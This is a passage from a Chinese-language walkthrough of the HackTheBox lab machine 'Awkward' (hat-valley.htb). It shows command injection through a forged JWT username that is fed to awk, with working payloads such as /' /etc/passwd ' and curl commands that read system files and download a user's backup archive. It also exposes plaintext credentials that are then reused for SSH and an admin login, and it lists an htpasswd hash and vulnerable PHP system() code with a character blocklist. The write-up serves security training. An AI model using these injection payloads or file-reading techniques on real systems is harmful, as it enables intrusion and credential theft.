  if<span class="token punctuation">(</span>badInUser<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Bad character detected<span class="token dyadic-operator operator">.</span>"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>

  exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span><span class="token function">,</span> <span class="token punctuation">(</span>error<span class="token function">,</span> stdout<span class="token function">,</span> stderr<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
    if<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>new Buffer<span class="token punctuation">(</span>stdout<span class="token function">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>stderr<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>

  <span class="token dfn builtin">}</span><span class="token punctuation">)</span>

<span class="token dfn builtin">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关键代码</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl"><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span>
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如我们让<code>user=/' /etc/passwd '</code>，那么得到的命令如下</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">awk <span class="token string">'//'</span> <span class="token monadic-operator operator">/</span>etc<span class="token monadic-operator operator">/</span>passwd <span class="token string">'/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以在自己本地测试</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303140858571.png"></p>
<p>用<a target="_blank" rel="noopener" href="https://jwt.io/">JWT Debugger</a>，先将获取到的token复制到Encoded文本框里，然后修改Decoded文本框中username值为<code>/' /etc/passwd '</code>，然后左侧Encoded文本框就会实时出现伪造后的token值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303150040606.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzc4MjAwNzN9.TyuC5rH79AtjGs4biOvMhtG0CHRm1HfLfrWqRhylrLk" | grep -i /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3059  100  3059    0     0   3216      0 --:--:-- --:--:-- --:--:--  3213
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现2个用户，bean和christine</p>
<p>尝试修改payload如下，执行类似上述的命令</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>报错Failed to retrieve leave requests</p>
<p>修改payload如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/christine/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>依然报错Failed to retrieve leave requests</p>
<p>修改如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.bashrc '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>有东西了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc3ODIwMDczfQ.NJ1ArXnFPdqvtf4K9Exdo34a4r73JZNUlg6VANAW7sQ"                    
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] &amp;&amp; [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概在98行，看到有</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>尝试用JWT去读<code>/home/bean/Documents/backup_home.sh</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzc4MjAwNzN9.FeikFTrIWzIe5LAJnPRZGH_Z7B1RLpfKJ4saxf9T74s"
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date &gt; /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看到有<code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></p>
<p>再用JWT去读，并且用curl把他输出到本地</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzgyMDA3M30.wArGs4nDtEexKppqgQ1gHSOrq1y91D486JBYTpN4f7E" --output bean_backup_final.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 31716  100 31716    0     0  20265      0  0:00:01  0:00:01 --:--:-- 20265<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>unzip不行，直接双击打开，把文件拖出来，依次得到如下图文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303170423291.png"></p>
<p>解压bean_backup.tar.gz得到以下文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop/bean_backup]
└─# ls -la
total 72
drwxr-x--- 15 1001 1001 4096 Sep 15 07:45 .
drwxr-x---  3 1001 1001 4096 Mar  3 04:19 ..
lrwxrwxrwx  1 1001 1001    9 Sep 15 07:40 .bash_history -&gt; /dev/null
-rw-r--r--  1 1001 1001  220 Sep 15 07:34 .bash_logout
-rw-r--r--  1 1001 1001 3847 Sep 15 07:45 .bashrc
drwx------ 12 1001 1001 4096 Sep 15 07:41 .config
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Desktop
drwxr-xr-x  4 1001 1001 4096 Sep 15 07:46 Documents
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Downloads
drwx------  2 1001 1001 4096 Sep 15 07:36 .gnupg
drwx------  3 1001 1001 4096 Sep 15 07:35 .local
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Music
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Pictures
-rw-r--r--  1 1001 1001  807 Sep 15 07:34 .profile
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Public
drwx------  3 1001 1001 4096 Sep 15 07:35 snap
drwx------  2 1001 1001 4096 Sep 15 07:36 .ssh
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Templates
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Videos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>.config/xpad/content-DS1ZS1</code>文件里发现一对疑似用户名密码的东西，最后还有一句，<code>MAKE SURE TO USE THIS EVERYWHERE</code>，看来这个账户密码会不止一次用到，由此可见，若是在真实渗透，前期收集的资产可能后期还会用到，整理好资产！</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean.hill	#连接ssh时发现用户名是bean
014mrbeanrules!#P<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172108467.png"></p>
<p>SSH连上去</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172702700.png"></p>
<h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>查看host文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/hosts
127.0.0.1       localhost hat-valley.htb store.hat-valley.htb
127.0.0.1       awkward

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现新子域名，添加进本地hosts文件，访问，发现要用户名密码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>网站是nginx服务器，nginx服务器的默认用户名密码通常在<code>/etc/nginx/conf.d/.htaccess</code>，那么我们尝试访问，但访问不到，发现有<code>/etc/nginx/conf.d/.htpasswd</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303173843111.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>hash尝试各种爆破无果，想起之前的<code>MAKE SURE TO USE THIS EVERYWHERE</code>，尝试各种组合之后，发现用户名是admin，密码是bean用户的密码，成功登入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303174518831.png"></p>
<p>经查找，站点源码在<code>/var/www/store</code>目录下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ ls -la
total 104
drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
drwxrwxrwx 2 root root  4096 Mar  3 21:30 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
drwxrwxrwx 2 root root  4096 Mar  3 21:50 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看<code>README.md</code></p>
<p>有几个信息</p>
<ol>
<li><p>没有数据库，只有离线文件</p>
</li>
<li><p><code>/product-details</code>存储产品信息</p>
</li>
<li><p><code>/cart</code>存储用户的购物车信息，并且根据用户的<code>session ID</code>命名</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ cat README.md                                       
# Hat Valley - Shop Online!                                                         
                                                                                     
### To Do                                                                             
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)                 
3. Implement shop filter                                                             
4. Get full catalogue of items                                                                           
### How to Add New Catalogue Item                                                     
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.  
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看<code>cart_actions.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$STORE_HOME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/store/"</span><span class="token punctuation">;</span>

<span class="token comment">//check for valid hat valley store item</span>
<span class="token keyword">function</span> <span class="token function-definition function">checkValidItem</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$first_line</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$first_line</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"***Hat Valley"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//add to cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'add_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo '***Hat Valley Cart***' &gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head -2 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt | tail -1 &gt;&gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item added successfully!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//delete from cart</span>
